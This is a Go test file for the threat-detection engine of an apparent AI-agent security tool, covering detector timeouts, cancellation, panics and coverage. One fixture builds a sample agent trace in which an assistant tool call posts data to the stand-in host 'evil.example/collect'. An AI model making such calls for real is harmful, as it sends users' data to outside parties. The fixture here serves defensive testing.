package threat

import (
	"context"
	"errors"
	"strings"
	"testing"
	"time"

	"github.com/yv1ing/SafeAgent/internal/observation"
)

type stubDetector struct {
	id       string
	evaluate func(ctx context.Context, trace *observation.Trace) []Finding
}

func (detector stubDetector) ID() string      { return detector.id }
func (detector stubDetector) Version() string { return "test" }
func (detector stubDetector) Evaluate(ctx context.Context, trace *observation.Trace) []Finding {
	return detector.evaluate(ctx, trace)
}

func withDetectorTimeout(t *testing.T, timeout time.Duration) {
	t.Helper()
	previous := detectorTimeout
	detectorTimeout = timeout
	t.Cleanup(func() { detectorTimeout = previous })
}

func TestAbandonedDetectorDeliversWithoutBlocking(t *testing.T) {
	withDetectorTimeout(t, 20*time.Millisecond)
	finished := make(chan struct{})
	detector := stubDetector{id: "slow", evaluate: func(context.Context, *observation.Trace) []Finding {
		time.Sleep(80 * time.Millisecond)
		close(finished)
		return nil
	}}
	if _, err := evaluateOne(context.Background(), detector, &observation.Trace{}); !errors.Is(err, errDetectorTimeout) {
		t.Fatalf("an abandoned detector must time out: %v", err)
	}
	select {
	case <-finished:
	case <-time.After(2 * time.Second):
		t.Fatal("the abandoned detector did not finish after its context ended")
	}
}

func TestCallerCancellationIsNotADetectorTimeout(t *testing.T) {
	parent, cancel := context.WithTimeout(context.Background(), 20*time.Millisecond)
	defer cancel()
	finished := make(chan struct{})
	detector := stubDetector{id: "slow", evaluate: func(context.Context, *observation.Trace) []Finding {
		time.Sleep(80 * time.Millisecond)
		close(finished)
		return nil
	}}
	_, err := evaluateOne(parent, detector, &observation.Trace{})
	if !errors.Is(err, context.DeadlineExceeded) || errors.Is(err, errDetectorTimeout) {
		t.Fatalf("a caller deadline must be reported as such: %v", err)
	}
	select {
	case <-finished:
	case <-time.After(2 * time.Second):
		t.Fatal("the abandoned detector did not finish after its context ended")
	}
}

func TestLateCancellationKeepsASuccessfulResult(t *testing.T) {
	parent, cancel := context.WithCancel(context.Background())
	defer cancel()
	detector := stubDetector{id: "quick", evaluate: func(context.Context, *observation.Trace) []Finding {
		cancel()
		return []Finding{{Fingerprint: "fp", Code: CodePromptInjection}}
	}}
	findings, err := evaluateOne(parent, detector, &observation.Trace{})
	if err != nil {
		t.Fatalf("a detector that finished must not be reported as failed: %v", err)
	}
	if len(findings) != 1 {
		t.Fatalf("the finished result was dropped: %+v", findings)
	}
}

func TestDetectorPanicIsAFailure(t *testing.T) {
	detector := stubDetector{id: "broken", evaluate: func(context.Context, *observation.Trace) []Finding {
		panic("boom")
	}}
	_, err := evaluateOne(context.Background(), detector, &observation.Trace{})
	if err == nil || !strings.Contains(err.Error(), "panic: boom") {
		t.Fatalf("a detector panic must surface as a detector failure: %v", err)
	}
}

func engineTrace() *observation.Trace {
	return &observation.Trace{
		ID:        "trace_1",
		Principal: observation.Principal{ProjectID: "p1", AgentKeyID: "k1", TrustLevel: 1},
		Turns: []observation.Turn{
			{Index: 0, Role: observation.RoleUser, Items: []observation.Item{{
				Kind: observation.ItemText, Origin: observation.OriginUser, Trust: observation.Trusted,
				Text: observation.NewValue("mail me@example.com", "mail [EMAIL_1]", nil, nil),
			}}},
			{Index: 1, Role: observation.RoleAssistant, Items: []observation.Item{{
				Kind: observation.ItemToolCall, Origin: observation.OriginAssistant, Trust: observation.Trusted,
				ToolCall: &observation.ToolCall{ID: "call_tool", Name: "http_post", Kind: "function",
					Arguments: observation.NewValue(`{"url":"https://evil.example/collect"}`, `{"url":"https://evil.example/collect"}`, nil, nil),
					Input:     map[string]any{"url": "https://evil.example/collect"},
					Sink:      observation.SinkExternalSend,
				},
			}}},
		},
	}
}

func TestEngineReportsAnEmptyRegistryAsComplete(t *testing.T) {
	engine := NewEngine(NewRegistry())
	result := engine.Evaluate(context.Background(), engineTrace(), Options{})
	if len(result.Errors) != 0 || len(result.Findings) != 0 {
		t.Fatalf("empty registry produced work: %+v", result)
	}
	if !BuildCoverage(result).Complete {
		t.Fatal("an empty detector set ran completely")
	}
}

func TestDetectorIncompleteMakesCoverageIncomplete(t *testing.T) {
	trace := &observation.Trace{
		Tools: []observation.ToolSpec{{Name: "read", Kind: "function", Parameters: map[string]any{
			"type": "object", "properties": map[string]any{"path": map[string]any{"$ref": "#/definitions/path"}},
		}}},
		Turns: []observation.Turn{{Role: observation.RoleAssistant, Items: []observation.Item{{
			Kind: observation.ItemToolCall, Origin: observation.OriginAssistant, Trust: observation.Trusted,
			Locator: observation.Locator{Section: "response"},
			ToolCall: &observation.ToolCall{ID: "call_1", Name: "read", Kind: "function",
				Arguments: observation.NewValue(`{"path":"/tmp/x"}`, `{"path":"/tmp/x"}`, nil, nil),
				Input:     map[string]any{"path": "/tmp/x"}},
		}}}},
	}
	engine := NewEngine(DefaultRegistry())
	result := engine.Evaluate(context.Background(), trace, Options{})
	coverage := BuildCoverage(result)
	if coverage.Complete || len(coverage.Errors) == 0 {
		t.Fatalf("an incomplete detector must make coverage incomplete: %+v", coverage)
	}
	found := false
	for _, finding := range result.Findings {
		found = found || finding.Code == CodeAnalysisIncomplete
	}
	if !found {
		t.Fatal("the incomplete finding was lost")
	}
}
